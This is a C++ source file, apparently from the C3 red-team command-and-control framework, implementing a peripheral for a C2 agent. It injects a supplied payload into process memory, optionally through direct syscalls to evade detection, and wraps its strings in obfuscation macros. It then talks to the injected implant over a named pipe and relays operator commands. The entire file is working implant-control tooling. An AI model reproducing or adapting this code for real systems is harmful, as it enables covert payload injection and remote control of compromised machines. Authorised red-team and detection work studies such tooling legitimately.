#include "StdAfx.h"
#include "0xC2Agent.h"

using namespace FSecure::Literals;

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Peripherals::OhxC2Agent::OhxC2Agent(ByteView arguments)
{
	auto [pipeName, maxConnectionAttempts, delayBetweenConnectionTrials, useSyscalls, payload] = arguments.Read<std::string, uint16_t, uint16_t, bool, ByteView>();

	// Arguments validation.
	if (payload.empty())
		throw std::invalid_argument(OBF("There was no payload provided."));

	if (pipeName.empty() || !maxConnectionAttempts)
		throw std::invalid_argument(OBF("Cannot establish connection with payload with provided parameters"));

	// Store a handle to the OhxC2Agent object for later use
	m_OhxC2Agent = WinTools::InjectionBuffer(payload, useSyscalls);
	DWORD threadId = GetThreadId(m_OhxC2Agent.GetThreadHandle());
	pipeName = pipeName + std::to_string(threadId);
	
	std::this_thread::sleep_for(std::chrono::milliseconds{ 1000 }); // Give OhxC2Agent thread time to start pipe.

	// Connect to our OhxC2Agent named Pipe.
	for (uint16_t connectionTrial = 0u; connectionTrial < maxConnectionAttempts; ++connectionTrial)
	{
		try
		{
			m_Pipe = WinTools::AlternatingPipe{ ByteView{ pipeName } };
			return;
		}
		catch (std::exception& e)
		{
			// Sleep between trials.
			Log({ OBF_SEC("OhxC2Agent constructor: ") + e.what(), LogMessage::Severity::DebugInformation });
			std::this_thread::sleep_for(std::chrono::milliseconds{ delayBetweenConnectionTrials });
		}
	}

	// Throw a time-out exception.
	throw std::runtime_error{ OBF("OhxC2Agent creation failed") };
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Peripherals::OhxC2Agent::~OhxC2Agent()
{
	HANDLE threadHandle = m_OhxC2Agent.GetThreadHandle();
	// Check if thread already finished running and kill if otherwise
	if (WaitForSingleObject(threadHandle, 0) != WAIT_OBJECT_0)
		TerminateThread(threadHandle, 0);
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Peripherals::OhxC2Agent::OnCommandFromConnector(ByteView data)
{
	m_SendQueue.emplace_back(data);
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Peripherals::OhxC2Agent::OnReceiveFromPeripheral()
{
	if (m_Close)
		return {};

	if (!m_SendQueue.empty())
	{
		auto msg = std::move(m_SendQueue.front());
		m_SendQueue.pop_front();
		m_Pipe->Write(msg);
	}
	return m_Pipe->Read(false);
}


bool FSecure::C3::Interfaces::Peripherals::OhxC2Agent::IsNoOp(ByteView data)
{
	return data.size() == 56u; // May need to decrypt checkin messages with sessionKey from the sqliteDB so we can reduce comms noise
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const char* FSecure::C3::Interfaces::Peripherals::OhxC2Agent::GetCapability()
{
	return R"(
{
	"create":
	{
		"arguments":
		[
			{
				"type": "int16",
				"min": 1,
				"defaultValue" : 10,
				"name": "Connection tries",
				"description": "Number of connection tries before marking whole staging process unsuccessful."
			},
			{
				"type": "int16",
				"min": 30,
				"defaultValue" : 1000,
				"name": "Connection delay",
				"description": "Time in milliseconds to wait between unsuccessful connection attempts."
			},
			{
				"type": "boolean",
				"name": "Use Syscalls",
				"defaultValue": false,
				"description": "Enable the use of Direct Syscalls for OhxC2Agent injection"
			}
		]
	},
	"commands": []
}
)";
}

void FSecure::C3::Interfaces::Peripherals::OhxC2Agent::Close()
{
	FSecure::C3::Device::Close();
	m_Close = true;
}

